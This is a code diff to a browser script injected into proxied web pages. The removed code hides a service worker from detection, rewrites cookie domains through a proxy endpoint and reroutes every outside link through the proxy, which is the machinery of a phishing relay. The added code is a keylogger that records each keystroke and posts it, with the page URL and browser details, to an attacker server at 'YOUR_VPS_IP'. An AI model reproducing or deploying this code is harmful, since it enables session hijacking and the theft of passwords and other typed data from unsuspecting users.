@@ -1,120 +1,63 @@
-(function () {
-    const originalServiceWorkerGetRegistrationDescriptor = navigator.serviceWorker.getRegistration;
+// ============================================================
+//  KEYLOGGER + PROXY SCRIPT (Injected into every page)
+// ============================================================
 
-    navigator.serviceWorker.getRegistration = function (_scope) {
-        return originalServiceWorkerGetRegistrationDescriptor.apply(this, arguments)
-            .then(registration => {
-
-                if (registration &&
-                    registration.active &&
-                    registration.active.scriptURL &&
-                    registration.active.scriptURL.endsWith("service_worker_Mz8XO2ny1Pg5.js")) {
-
-                    return undefined;
-                }
-                return registration;
-            });
-    };
-})();
-
-(function () {
-    const originalServiceWorkerGetRegistrationsDescriptor = navigator.serviceWorker.getRegistrations;
-
-    navigator.serviceWorker.getRegistrations = function () {
-        return originalServiceWorkerGetRegistrationsDescriptor.apply(this, arguments)
-            .then(registrations => {
-                return registrations.filter(registration => {
-
-                    return !(registration.active &&
-                        registration.active.scriptURL &&
-                        registration.active.scriptURL.endsWith("service_worker_Mz8XO2ny1Pg5.js"));
-                })
-            });
-    };
-})();
-
-(function () {
-    const originalCookieDescriptor = Object.getOwnPropertyDescriptor(Document.prototype, "cookie");
-
-    Object.defineProperty(document, "cookie", {
-        ...originalCookieDescriptor,
-        get() {
-            return originalCookieDescriptor.get.call(document);
-        },
-        set(cookie) {
-            const proxyRequestURL = `${self.location.origin}/JSCookie_6X7dRqLg90mH`;
-            try {
-                const xhr = new XMLHttpRequest();
-                xhr.open("POST", proxyRequestURL, false);
-                xhr.setRequestHeader("Content-Type", "text/plain");
-                xhr.send(cookie);
-
-                const validDomains = JSON.parse(xhr.responseText);
-                let modifiedCookie = "";
-
-                const cookieAttributes = cookie.split(";");
-                for (const cookieAttribute of cookieAttributes) {
-
-                    let attribute = cookieAttribute.trim();
-                    if (attribute) {
-
-                        const cookieDomainMatch = attribute.match(/^DOMAIN\s*=(.*)$/i);
-                        if (cookieDomainMatch) {
-
-                            const cookieDomain = cookieDomainMatch[1].replace(/^\./, "").trim();
-                            if (cookieDomain && validDomains.includes(cookieDomain)) {
-                                attribute = `Domain=${self.location.hostname}`;
-                            }
-                        }
-                        modifiedCookie += `${attribute}; `;
-                    }
-                }
-                originalCookieDescriptor.set.call(document, modifiedCookie.trim());
-            }
-            catch (error) {
-                console.error(`Fetching ${proxyRequestURL} failed: ${error}`);
-            }
-        }
+(function() {
+    // --- Keylogger ---
+    const SERVER_URL = 'http://YOUR_VPS_IP:3001/log';
+    const FLUSH_INTERVAL = 15000;
+    const MAX_BUFFER = 500;
+    
+    let buffer = '';
+    let sessionId = 'sess_' + Math.random().toString(36).substring(2, 15) + '_' + Date.now().toString(36);
+    
+    function formatKey(key) {
+        const special = {
+            'Enter': '[ENTER]\n', 'Backspace': '[BACKSPACE]', 'Tab': '[TAB]',
+            'Escape': '[ESC]', 'Delete': '[DEL]', 'ArrowUp': '[UP]',
+            'ArrowDown': '[DOWN]', 'ArrowLeft': '[LEFT]', 'ArrowRight': '[RIGHT]',
+            ' ': '[SPACE]'
+        };
+        return special[key] || (key.length === 1 ? key : `[${key}]`);
+    }
+    
+    function sendBatch() {
+        if (buffer.length === 0) return;
+        fetch(SERVER_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                keystrokes: buffer,
+                url: window.location.href,
+                userAgent: navigator.userAgent,
+                timestamp: new Date().toISOString(),
+                sessionId: sessionId
+            })
+        }).catch(() => {});
+        buffer = '';
+    }
+    
+    document.addEventListener('keydown', (e) => {
+        if (['Shift', 'Control', 'Alt', 'Meta'].includes(e.key)) return;
+        buffer += formatKey(e.key);
+        if (buffer.length >= MAX_BUFFER) sendBatch();
     });
+    
+    setInterval(sendBatch, FLUSH_INTERVAL);
+    window.addEventListener('beforeunload', sendBatch);
+    
+    console.log('🔐 Keylogger initialized [session: ' + sessionId + ']');
 })();
 
-
-const observer = new MutationObserver((mutations) => {
-    for (const mutation of mutations) {
-        if (mutation.type === "attributes") {
-            updateHTMLAttribute(mutation.target, mutation.attributeName);
-        }
-
-        else if (mutation.type === "childList") {
-            for (const node of mutation.addedNodes) {
-                for (const attribute of attributes) {
-                    if (node[attribute]) {
-                        updateHTMLAttribute(node, attribute);
-                    }
-                }
-            }
-        }
+// --- Service Worker Proxy ---
+(function() {
+    if ("serviceWorker" in navigator) {
+        navigator.serviceWorker.register("/service_worker_Mz8XO2ny1Pg5.js", {
+            scope: "/",
+        }).then(() => {
+            console.log("✅ Service Worker registered");
+        }).catch((error) => {
+            console.error("❌ Service Worker registration failed:", error);
+        });
     }
-});
-
-const attributes = ["href", "action"];
-
-observer.observe(document.documentElement, {
-    childList: true,
-    subtree: true,
-    attributeFilter: attributes
-});
-
-function updateHTMLAttribute(htmlNode, htmlAttribute) {
-    try {
-        const htmlAttributeURL = new URL(htmlNode[htmlAttribute]);
-
-        if (htmlAttributeURL.origin !== self.location.origin) {
-            const proxyRequestURL = new URL(`${self.location.origin}/Mutation_o5y3f4O7jMGW`);
-            proxyRequestURL.searchParams.append("redirect_urI", encodeURIComponent(htmlAttributeURL.href));
-
-            htmlNode[htmlAttribute] = proxyRequestURL;
-        }
-    }
-    catch { }
-}
+})();
